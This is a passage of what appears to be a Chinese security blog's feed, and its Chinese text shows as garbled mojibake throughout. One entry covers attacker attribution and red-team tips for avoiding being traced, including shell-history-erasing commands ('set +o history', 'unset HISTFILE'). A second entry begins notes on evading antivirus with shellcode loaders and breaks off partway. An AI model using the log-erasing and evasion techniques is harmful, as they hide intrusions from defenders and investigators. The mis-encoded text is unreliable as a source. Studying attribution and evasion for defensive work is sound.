plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IDè¿½è¸ªæœ¯ï¼Œæœç´¢å¼•æ“ã€ç¤¾äº¤å¹³å°ã€æŠ€æœ¯è®ºå›ã€ç¤¾å·¥åº“åŒ¹é…</span><br><span class="line">æº¯æºæ¡ˆä¾‹ï¼šåˆ©ç”¨IDä»æŠ€æœ¯è®ºå›è¿½æº¯é‚®ç®±ï¼Œç»§ç»­é€šè¿‡é‚®ç®±åè¿½è¸ªçœŸå®å§“åï¼Œé€šè¿‡å§“åæ‰¾åˆ°ç›¸å…³ç®€å†ä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="ç½‘ç«™url"><a href="#ç½‘ç«™url" class="headerlink" title="ç½‘ç«™url"></a>ç½‘ç«™url</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŸŸåWhoisæŸ¥è¯¢â€”æ³¨å†Œäººå§“åã€åœ°å€ã€ç”µè¯å’Œé‚®ç®±ã€‚â€”åŸŸåéšç§ä¿æŠ¤</span><br><span class="line"> æº¯æºæ¡ˆä¾‹ï¼šé€šè¿‡æ”»å‡»IPå†å²è§£æè®°å½•&#x2F;åŸŸåï¼Œå¯¹åŸŸåæ³¨å†Œä¿¡æ¯è¿›è¡Œæº¯æºåˆ†æ</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸€èˆ¬æŠ€æœ¯äººå‘˜åº”è¯¥éƒ½æ˜¯é™æ€åšå®¢å§ï¼Œhexo è¿™äº›ã€‚</p><h2 id="æ¶æ„æ ·æœ¬"><a href="#æ¶æ„æ ·æœ¬" class="headerlink" title="æ¶æ„æ ·æœ¬"></a>æ¶æ„æ ·æœ¬</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æå–æ ·æœ¬ç‰¹å¾ã€ç”¨æˆ·åã€IDã€é‚®ç®±ã€C2æœåŠ¡å™¨ç­‰ä¿¡æ¯â€”åŒæºåˆ†æ</span><br><span class="line">æº¯æºæ¡ˆä¾‹ï¼šæ ·æœ¬åˆ†æè¿‡ç¨‹ä¸­ï¼Œå‘ç°æ”»å‡»è€…çš„ä¸ªäººIDå’ŒQQï¼ŒæˆåŠŸå®šä½åˆ°æ”»å‡»è€…ã€‚</span><br></pre></td></tr></table></figure><h2 id="ç¤¾äº¤è´¦å·"><a href="#ç¤¾äº¤è´¦å·" class="headerlink" title="ç¤¾äº¤è´¦å·"></a>ç¤¾äº¤è´¦å·</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŸºäºJSONPè·¨åŸŸï¼Œè·å–æ”»å‡»è€…çš„ä¸»æœºä¿¡æ¯ã€æµè§ˆå™¨ä¿¡æ¯ã€çœŸå® IPåŠç¤¾äº¤ä¿¡æ¯ç­‰</span><br><span class="line"> åˆ©ç”¨æ¡ä»¶ï¼šå¯ä»¥æ‰¾åˆ°ç›¸å…³ç¤¾äº¤ç½‘ç«™çš„jsonpæ¥å£æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œç›¸å…³ç½‘ç«™ç™»å½•æœªæ³¨é”€</span><br></pre></td></tr></table></figure><h2 id="æ”»å‡»è€…ç”»åƒ"><a href="#æ”»å‡»è€…ç”»åƒ" class="headerlink" title="æ”»å‡»è€…ç”»åƒ"></a>æ”»å‡»è€…ç”»åƒ</h2><p>æ”»å‡»è·¯å¾„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»ç›®çš„ï¼šæ‹¿åˆ°æƒé™ã€çªƒå–æ•°æ®ã€è·å–åˆ©ç›Šã€DDOSç­‰</span><br><span class="line">ç½‘ç»œä»£ç†ï¼šä»£ç†IPã€è·³æ¿æœºã€C2æœåŠ¡å™¨ç­‰</span><br><span class="line">æ”»å‡»æ‰‹æ³•ï¼šé±¼å‰å¼é‚®ä»¶é’“é±¼ã€Webæ¸—é€ã€æ°´å‘æ”»å‡»ã€è¿‘æºæ¸—é€ã€ç¤¾ä¼šå·¥ç¨‹ç­‰</span><br></pre></td></tr></table></figure><p> æ”»å‡»è€…èº«ä»½ç”»åƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è™šæ‹Ÿèº«ä»½ï¼šIDã€æ˜µç§°ã€ç½‘å</span><br><span class="line">çœŸå®èº«ä»½ï¼šå§“åã€ç‰©ç†ä½ç½®</span><br><span class="line">è”ç³»æ–¹å¼ï¼šæ‰‹æœºå·ã€qq&#x2F;å¾®ä¿¡ã€é‚®ç®±</span><br><span class="line">ç»„ç»‡æƒ…å†µï¼šå•ä½åç§°ã€èŒä½ä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="æ¡ˆä¾‹-1"><a href="#æ¡ˆä¾‹-1" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><h3 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h3><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222225526.png"></p><h3 id="é’“é±¼é‚®ä»¶"><a href="#é’“é±¼é‚®ä»¶" class="headerlink" title="é’“é±¼é‚®ä»¶"></a>é’“é±¼é‚®ä»¶</h3><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222225945.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222231625.png"></p><h2 id="é˜²å®ˆç»„ç»‡æ¶æ„"><a href="#é˜²å®ˆç»„ç»‡æ¶æ„" class="headerlink" title="é˜²å®ˆç»„ç»‡æ¶æ„"></a>é˜²å®ˆç»„ç»‡æ¶æ„</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222230535.png"></p><p>1ã€å·²çŸ¥æ¼æ´ï¼šæ¼”ä¹ ä¹‹å‰ï¼Œæˆ‘ä»¬åšäº†ä¼—æµ‹ã€çº¢è“å¯¹æŠ—ï¼Œå‘ç°äº†ä¸€äº›å®‰å…¨é—®é¢˜ã€‚ç›¸ä¿¡è¿™äº›é—®é¢˜ï¼Œå¯èƒ½æå‰è¢«æŸäº›æ”»å‡»è€…å·²ç»æŒæ¡ï¼Œäºæ˜¯å°†è®¡å°±è®¡ï¼Œæˆ‘ä»¬æŠŠè¿™ç±»æ¼æ´åšæˆè¯±é¥µã€‚ä¾‹å¦‚ shiroæ¼æ´ï¼Œspringboot çš„ actuator ç›‘æ§ç­‰ã€‚</p><p>2ã€çƒ­é—¨æ¼æ´ï¼šä»Šå¹´æ¼”ä¹ ä¸€æ³¢ä¸‰æŠ˜ï¼Œç¬¬ä¸€å¤©çˆ†å‡ºäº†å‡ åä¸ª0dayï¼Œä½•ä¸å°†è®¡å°±è®¡ï¼Ÿåˆ©ç”¨è¿™äº›æ¼æ´æ¥åšè¯±é¥µå‘¢ï¼Œé…ä¸Šä¸€äº›å†å²åŸŸåã€æ¬ºéª—åŸŸåæœç”¨ï¼Œæ•ˆæœæ›´ä½³ã€‚ä¾‹å¦‚ç”¨ vpn.b.cn è¿è¡ŒæŸæœ VPN ç¨‹åºã€‚</p><p>3ã€äº§å“ç‰¹æ€§ï¼šèœœç½å‚å®¶éƒ½æœ‰å„è‡ªçš„ç‰¹è‰²ã€‚æ¯”å¦‚ A å®¶æœ‰Mysql ååˆ¶èœœç½ï¼ŒBå®¶æœ‰RDPååˆ¶èœœç½ï¼Œè¿™äº›éƒ½å¯ä»¥åˆç†æ­é…ä½¿ç”¨ã€‚</p><h2 id="æº¯æºååˆ¶æ€»ç»“"><a href="#æº¯æºååˆ¶æ€»ç»“" class="headerlink" title="æº¯æºååˆ¶æ€»ç»“"></a>æº¯æºååˆ¶æ€»ç»“</h2><p>å‚è€ƒï¼š<a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222234241.png"></p><h1 id="å¦‚ä½•é˜²æ­¢æº¯æºï¼ˆçº¢é˜Ÿè§’åº¦ï¼‰"><a href="#å¦‚ä½•é˜²æ­¢æº¯æºï¼ˆçº¢é˜Ÿè§’åº¦ï¼‰" class="headerlink" title="å¦‚ä½•é˜²æ­¢æº¯æºï¼ˆçº¢é˜Ÿè§’åº¦ï¼‰"></a>å¦‚ä½•é˜²æ­¢æº¯æºï¼ˆçº¢é˜Ÿè§’åº¦ï¼‰</h1><blockquote><p>å‰é¢ä¸¤ç‚¹éƒ½æ˜¯è“é˜Ÿè§’åº¦ã€‚è¯´è¯´çº¢é˜Ÿå¦‚ä½•é˜²æ­¢è¢«æº¯æºå§ã€‚</p></blockquote><p>ä»»ä½•éœ€è¦è®¤è¯çš„åœ°æ–¹ï¼Œä¸ç”¨è‡ªå·±çœŸå®çš„ï¼Œä¹Ÿä¸ç”¨ä»»ä½•å’Œå…¬å¸æœ‰å…³çš„åè¯ã€‚</p><p>ä»»ä½•éœ€è¦äº¤äº’æ“ä½œçš„åœ°æ–¹ï¼Œéƒ½éœ€è¦æŒ‚ä¸Šå…¨å±€ä»£ç†ï¼Œå°½é‡ä¸ç”¨æš´éœ²è‡ªå·±çš„çœŸå®ipï¼Œå…¶æ¬¡ï¼Œè­¦æƒ•èœœç½ï¼Œå°±é‚£ç§çœ‹èµ·æ¥éƒ½å¤šæ¼æ´çš„ç«™ç‚¹ï¼Œç›´æ¥è®¿é—®è·³åˆ°åå°ï¼Œç„¶åadminã€123456å°±è¿›å»è¿™ç§ï¼Œç¨å¾®æ³¨æ„ä¸€ä¸‹ã€‚</p><p>ä»»ä½•æœåŠ¡å™¨ï¼ŒC2ã€æ–‡ä»¶æœåŠ¡å™¨ï¼Œæ‰«æå™¨ï¼Œéƒ½è¦ç‰¹æ®Šç”¨é€”ç‰¹æ®Šæ“ä½œã€‚</p><p>ä¸å¼€æ— ç”¨ç«¯å£ã€‚</p><p>å³ï¼šåŒ¿åæ€§ã€ä¸“ä¸šæ€§ã€ç²¾ç»†åŒ–</p><hr><blockquote><p>åˆ«ä¿¡æ‰€è°“çš„ç»å¯¹æ— åé—¨ï¼Œåªä¸è¿‡æ˜¯ä½ å‘ç°ä¸äº†ã€‚</p><p>å¾ˆå¤šç¥å™¨æ²¡æœ‰åŠæ³•è‡ªå·±å¼€å‘ä¹Ÿåªèƒ½å°†å°±ç€ç”¨</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†é¿å…ä¿¡æ¯æ³„éœ²é‡</p><p>è¦æ–‡ä»¶ç»å¯¹ä¸èƒ½æ”¾åœ¨æ”»å‡»æœºä¸Šã€‚</p></blockquote><p>ï¼ˆ1ï¼‰æ‰€æœ‰å·¥ä½œå‡åœ¨è™šæ‹Ÿæœºè¿›è¡Œ</p><p>ï¼ˆ2ï¼‰æµé‡ç»Ÿä¸€ç»ç½‘å…³èµ°VPNè¿›å‡º</p><p>ï¼ˆ3ï¼‰ä¸åŒéœ€æ±‚åˆ†é…ä¸åŒè™šæ‹Ÿæœº</p><p>ï¼ˆ4ï¼‰æ–‡ä»¶ç‹¬ç«‹</p><p>ï¼ˆ5ï¼‰å…¨ç›˜åŠ å¯†&amp;æ‹’ç»å¼±å¯†ç </p><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>çœŸå®APTçš„è¯ï¼Œé‚£è‚¯å®šæ˜¯é«˜åŒ¿åæ€§çš„ã€‚ä½†æ˜¯ä½œä¸ºæ¼”ä¹ ï¼Œä¸€èˆ¬å°±è¡Œäº†ã€‚</p><ol><li>çº¿è·¯åŒ¿å</li></ol><p>ï¼ˆ1ï¼‰ç½‘ç»œæ¥å…¥ç‚¹åŒ¿å</p><p>ï¼ˆ2ï¼‰é€”å¾„èŠ‚ç‚¹åŒ¿åä¸”åŠ å¯†</p><p>ï¼ˆ3ï¼‰ä½¿ç”¨çš„å…¬ç½‘æœåŠ¡å™¨åŒ¿å</p><ol start="2"><li>ç½‘ç»œæ¥å…¥ç‚¹åŒ¿å</li></ol><h2 id="å®‰å…¨æ“ä½œæ¶ä¹ "><a href="#å®‰å…¨æ“ä½œæ¶ä¹ " class="headerlink" title="å®‰å…¨æ“ä½œæ¶ä¹ "></a>å®‰å…¨æ“ä½œæ¶ä¹ </h2><p>ï¼ˆ1ï¼‰å›¾çœäº‹ç‰©ç†æœºè¿VPNç›´æ¥æ</p><p>è¿™ç§æƒ…å†µåŸºæœ¬æ„å‘³ç€ä½ æ²¡å•¥åŒ¿åå¯è¨€</p><p>è€Œä¸”ä¸€èˆ¬è¿™ä¹ˆåšçš„äºº</p><p>å„ç§é»‘å®¢è½¯ä»¶ä¹Ÿæ˜¯ç›´æ¥åœ¨ç‰©ç†æœºè¿è¡Œã€‚</p><p>å¦¥å¦¥çš„æˆåˆ«äººè‚‰é¸¡ï¼Œè¿˜æ˜¯ä¼šè‡ªè§‰ä¸Šçº¿çš„é‚£ç§ã€‚</p><p>ç®€ç›´èŒèŒå“’</p><p>ï¼ˆ2ï¼‰è´¦æˆ·æ··ç”¨</p><p>æ¯”å¦‚åœ¨é¡¹ç›®Aä¸­ç”¨äº†ä¸€ä¸ªåŒ¿åé‚®ç®±</p><p>æˆ–è€…å…¶ä»–ä»€ä¹ˆè´¦æˆ·ã€‚</p><p>åœ¨é¡¹ç›®Bä¸­ç»§ç»­ä½¿ç”¨ã€‚</p><p>è¿™æ ·çš„è¯æœ‰å…³æœºæ„å¾ˆå®¹æ˜“</p><p>æ ¹æ®è¿™ä¸ªé‚®ç®±æŠŠä½ çš„è¶³è¿¹å…³è”èµ·æ¥</p><p>ç”±BæŒ–å‡ºAï¼Œå¯èƒ½ä½ åœ¨Bé¡¹ç›®ä¸­å…¶ä»–éƒ½åšå¾—å¾ˆå¥½</p><p>æ²¡ç»™åˆ«äººæœºä¼šè¿½æŸ¥ä½ ï¼Œä½†æ˜¯</p><p>é¡¹ç›®Aç”±äºæ˜¯ä½ æ—©æœŸåšçš„é¡¹ç›®</p><p>æ¼æ´ç™¾å‡ºï¼Œç»™äº†ä»–ä»¬è¿½æŸ¥ä½ çš„æœºä¼šã€‚</p><p>ï¼ˆ3ï¼‰å…¬ç§ä¸åˆ†</p><p>æœ€å¸¸è§çš„å°±æ˜¯éšæ‰‹æŠŠé¡¹ç›®æˆªå›¾ä¹‹ç±»çš„ä¸œè¥¿</p><p>ç»ç”±ç§äººè´¦æˆ·å‘åˆ°QQå¾®ä¿¡</p><p>æ­¤å¤–è¿˜æœ‰ç”¨ç§äººé‚®ç®±ï¼Œ</p><p>æ‰‹æœºå·å‘é€æ–‡ä»¶å’Œä¿¡æ¯ã€‚æ¥æ”¶éªŒè¯ç ä¹‹ç±»ã€‚</p><p>ï¼ˆ4ï¼‰ç•™ç‰¹å¾å€¼ï¼Œè¿™ç‚¹å¤šè§äºè‡ªå†™å·¥å…·</p><p>ï¼ˆ5ï¼‰ç”µè„‘ä¸å…³æœºå°±ç¦»å¼€</p><p>ï¼ˆ6ï¼‰é»‘é¡µ</p><p>ï¼ˆ7ï¼‰å¯†ç é€šç”¨</p><p>ï¼ˆ8ï¼‰æ—©æœŸç›®æ ‡è°ƒç ”çš„æ—¶å€™ç”¨çœŸå®IPå»è®¿é—®</p><h2 id="åèœœç½"><a href="#åèœœç½" class="headerlink" title="åèœœç½"></a>åèœœç½</h2><p>æœ‰æ’ä»¶ã€ä¹Ÿå¯ä»¥è‡ªå·±åˆ¤æ–­æ˜¯å¦ä¸ºèœœç½ã€‚</p><p>æœ€å¥½çš„æ–¹å¼æ˜¯æŠŠæµè§ˆå™¨ä¸­çš„ç™»å½•è®°å½•ç»™åˆ ç‚¹ã€‚æˆ–è€…æ˜¯åœ¨è™šæ‹Ÿæœºä¸­æ“ä½œã€‚</p><h2 id="æ¸…é™¤æ—¥å¿—æ–¹å¼"><a href="#æ¸…é™¤æ—¥å¿—æ–¹å¼" class="headerlink" title="æ¸…é™¤æ—¥å¿—æ–¹å¼"></a>æ¸…é™¤æ—¥å¿—æ–¹å¼</h2><ul><li><code>kill &lt;bash process ID&gt;</code> ä¸ä¼šå­˜å‚¨</li><li><code>set +o history</code> ä¸å†™å…¥å†å²è®°å½•</li><li><code>unset HISTFILE</code> æ¸…é™¤å†å²è®°å½•çš„ç¯å¢ƒå˜é‡</li></ul><p>è¿˜æœ‰æ›´å¤šã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://help.aliyun.com/document_detail/99611.html">https://help.aliyun.com/document_detail/99611.html</a></p><p><a href="https://www.secrss.com/articles/26264">https://www.secrss.com/articles/26264</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13817637.html">https://www.cnblogs.com/xiaozi/p/13817637.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/defense/forensic.html">https://websec.readthedocs.io/zh/latest/defense/forensic.html</a></p><p><a href="https://www.freebuf.com/articles/network/202168.html">https://www.freebuf.com/articles/network/202168.html</a></p><p><a href="https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/">https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/</a></p><p><a href="https://zhuanlan.zhihu.com/p/26217643">https://zhuanlan.zhihu.com/p/26217643</a></p><p><a href="https://www.anquanke.com/post/id/197104">https://www.anquanke.com/post/id/197104</a></p><p><a href="https://www.secrss.com/articles/27611">https://www.secrss.com/articles/27611</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¸©æ•…è€ŒçŸ¥æ–°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222210541.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="çº¢è“å¯¹æŠ—" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>å…æ€å­¦ä¹ ï¼šé™æ€æ¶æ„ä»£ç é€ƒé€¸</title>
    <link href="https://hack-for.fun/bd13.html"/>
    <id>https://hack-for.fun/bd13.html</id>
    <published>2021-02-20T02:52:10.000Z</published>
    <updated>2021-02-20T15:30:57.125Z</updated>
    
    <content type="html"><![CDATA[<p>äº†è§£äº†è§£</p><a id="more"></a><p>[toc]</p><h1 id="å‚è€ƒè¯¾ç¨‹"><a href="#å‚è€ƒè¯¾ç¨‹" class="headerlink" title="å‚è€ƒè¯¾ç¨‹"></a>å‚è€ƒè¯¾ç¨‹</h1><p>å‚è€ƒè¯¾ç¨‹ä»¥åŠèµ„æ–™å¦‚ä¸‹ï¼š</p><p>ä½œè€…ï¼š å€¾æ—‹</p><p><a href="https://payloads.online/archivers/2019-09-24/1">åæ¸—é€ä¸‹é‡åˆ°çš„é—®é¢˜ä¸€ï¼ˆé™æ€å…æ€ï¼‰</a></p><ul><li><a href="https://payloads.online/archivers/2019-11-10/1">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¸€è¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2019-11-10/2">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬äºŒè¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2019-11-10/3">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¸‰è¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2019-11-10/4">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬å››è¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2019-11-10/5">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬äº”è¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2020-01-02/1">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬å…­è¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2020-10-23/1">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¸ƒè¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2020-11-29/1">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬å…«è¯¾ï¼‰</a></li><li><a href="https://payloads.online/archivers/2020-11-29/2">é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¹è¯¾ï¼‰</a></li><li>ç¬¬åè¯¾ <a href="https://payloads.online/archivers/2021-02-08/1">https://payloads.online/archivers/2021-02-08/1</a></li></ul><p><a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p><p><strong>ä¸ºäº†å­¦ä¹ çš„å®Œæ•´æ€§ï¼Œæ¨èå„ä½å¸ˆå‚…å»çœ‹åŸæ–‡å­¦ä¹ ï¼Œæœ¬æ–‡åªæ˜¯æˆ‘çš„ä¸ªäººæ‘˜æŠ„ç¬”è®°ï¼Œä»…ç”¨åšä¸ªäººå­¦ä¹ ç”¨é€”ã€‚</strong></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p>é€šå¸¸åœ¨æ¼”ç»ƒè¿‡ç¨‹é‡Œï¼Œç›®çš„æ˜¯è¿½æ±‚å¿«é€Ÿçš„è·å–æ›´å¤šçš„æƒé™ï¼Œä½†æ˜¯ç›®æ ‡æœºå™¨éƒ½å®‰è£…äº†å„ç§åç—…æ¯’è½¯ä»¶ï¼Œç§ç±»ç¹å¤šï¼Œå¤§å¤šå¯¹äºé™æ€æŸ¥æ€ç®¡æ§è¾ƒä¸ºä¸¥æ ¼ï¼Œå¯¼è‡´ä¸€äº›å·¥å…·æ— æ³•ä½¿ç”¨ã€‚è€Œåœ¨è¿™ä¸ªå¤¹ç¼ä¸­ç”Ÿå­˜çš„æ¸—é€å¸ˆï¼Œå°±å¿…é¡»è¦å­¦ä¹ æ›´å¤šçš„çŸ¥è¯†</p></blockquote><h2 id="å…³äºä»£ç "><a href="#å…³äºä»£ç " class="headerlink" title="å…³äºä»£ç "></a>å…³äºä»£ç </h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸ç®¡æ˜¯Linuxæ“ä½œç³»ç»Ÿã€Windowsæ“ä½œç³»ç»Ÿï¼Œå¯æ‰§è¡Œçš„åº”ç”¨ç¨‹åºæ–‡ä»¶ï¼Œéƒ½éµå¾ªç€ä¸€ç§æ ¼å¼ï¼š</p><ul><li>Linux ELF</li><li>Windows PE</li></ul><p>è¿™ç§æ ¼å¼åˆåŒ…å«äº†ï¼šå¯æ‰§è¡Œçš„åº”ç”¨ç¨‹åºã€åŠ¨æ€é“¾æ¥åº“ç­‰ç­‰ï¼Œå¦‚Windowsä¸‹çš„*.exeã€*.dllã€‚</p><p>è€Œè¿™äº›æ–‡ä»¶ï¼Œå…¶ä¸­éƒ½æœ‰ä¸€å—ç©ºé—´ç”¨äºä¿å­˜ç¨‹åºçš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯æŒ‡ä»¤é›†ï¼Œæ“ä½œç³»ç»Ÿè‹¥æƒ³è¦æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ï¼Œå°±è¦å…ˆå°†æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶åˆ†é…ç›¸åº”çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œåˆ›å»ºä¸€ä¸ªè¿›ç¨‹å’Œçº¿ç¨‹ï¼Œçº¿ç¨‹å†å»æ‰§è¡Œç¨‹åºçš„ä»£ç ã€‚</p><p>é‚£ä¹ˆå‡è®¾å¦‚ä¸Šå¯ä»¥ç†è§£ï¼Œå°±èƒ½å¤Ÿæ¨æ–­å‡ºå¸¸ç”¨çš„ShellcodeåŠ è½½å™¨çš„å·¥ä½œåŸç†ï¼š</p><ul><li>Shellcodeæ˜¯ä»£ç æœ¬èº«</li><li>åŠ è½½å™¨æ˜¯å…·å¤‡è¯»å–ä»£ç çš„ç¨‹åº</li><li>åŠ è½½å™¨æ‰§è¡Œåï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªè¿›ç¨‹ä¸ä¸€ä¸ªçº¿ç¨‹</li><li>ç¬¬ä¸€ä¸ªçº¿ç¨‹ç”¨äºè¯»å–ä»£ç ï¼ˆShellcodeï¼‰å¹¶åˆ›å»ºç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œå°†çº¿ç¨‹æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æŒ‡å‘ä»£ç ï¼ˆShellcodeï¼‰</li></ul><h2 id="å…³äºå†…å­˜"><a href="#å…³äºå†…å­˜" class="headerlink" title="å…³äºå†…å­˜"></a>å…³äºå†…å­˜</h2><p>åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹äº’ä¸å¹²æ‰°ï¼ˆé™¤äº†å…¬ç”¨çš„å†…æ ¸å¯¹è±¡ä»¥å¤–ï¼‰ï¼Œéƒ½æœ‰è‡ªå·±çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œè€Œè¿™ä¸€å—çº¿æ€§çš„å†…å­˜ç©ºé—´åˆè¢«åˆ‡æˆä¸€é¡µä¸€é¡µçš„å¤§å°ï¼Œé€šå¸¸é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯é¡µçš„å¤§å°æ˜¯4KBã€‚</p><p>Windowsé€šè¿‡ä»¥é¡µçš„å•ä½æ¥ç®¡ç†è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´ï¼Œæœ€å…¸å‹çš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>VirtualAlloc</code> Windows API å¯å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ç©ºé—´ï¼Œæ“ä½œç³»ç»Ÿæ ¹æ®æŒ‡å®šçš„å¤§å°æ¥è°ƒæ•´åˆ†é…å‡ é¡µï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨è¿›è¡Œå†…å­˜å¯¹é½ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦è®²åˆ°å†…å­˜å‘¢ï¼Œå› ä¸º<strong>é™æ€å…æ€çš„æ ¸å¿ƒå°±æ˜¯å°†ä»£ç åŠ è½½è‡³å†…å­˜</strong>ï¼Œç†è§£å†…å­˜çš„ç®¡ç†æ–¹å¼ï¼Œæ‰èƒ½äº§ç”Ÿæ›´å¤šçš„æƒ³æ³•ã€‚</p></blockquote><h2 id="å…³äºé™æ€å…æ€"><a href="#å…³äºé™æ€å…æ€" class="headerlink" title="å…³äºé™æ€å…æ€"></a>å…³äºé™æ€å…æ€</h2><p>é™æ€å…æ€ï¼Œæèµ·è¿™ä¸ªå¾ˆå¤šäººä¼šæƒ³åˆ°å¾ˆä¹…è¿œçš„â€¦. <strong>èŠ±æŒ‡ä»¤ã€å‹ç¼©å£³ã€åƒåœ¾èµ„æº</strong> ç­‰ç­‰ã€‚</p><p>ä½†æ˜¯ç”±äºShellcodeåŠ è½½å™¨çš„å‡ºç°ï¼Œå¾ˆå¤šäººå¼€å§‹ä»æºç æ–¹é¢å‡ºå‘ï¼Œé€šè¿‡æ­£å¸¸ä¸”æ— å®³çš„APIæ¥æ„å»ºä¸€ä¸ªåŠ è½½å™¨ã€‚</p><p>ç›®å‰è§çš„æœ€å¤šçš„æ˜¯ä¸¤å¤§åŠ è½½å™¨ï¼š</p><ul><li>ShellcodeåŠ è½½å™¨</li><li>PEåŠ è½½å™¨</li></ul><p>ä¸¤è€…æœ‰ä»€ä¹ˆä¸åŒå‘¢ï¼Œæˆ‘æƒ³å¯èƒ½å°±æ˜¯åŠ è½½çš„æ–‡ä»¶æ ¼å¼ä¸åŒï¼Œä½†æœ€ç»ˆéƒ½è¦è¿è¡Œæ–‡ä»¶ä¸­çš„ä»£ç ã€‚</p><h1 id="é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¸€è¯¾ï¼‰"><a href="#é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¸€è¯¾ï¼‰" class="headerlink" title="é™æ€æ¶æ„ä»£ç é€ƒé€¸ï¼ˆç¬¬ä¸€è¯¾ï¼‰"></a>é™æ€æ¶æ„ä»£ç 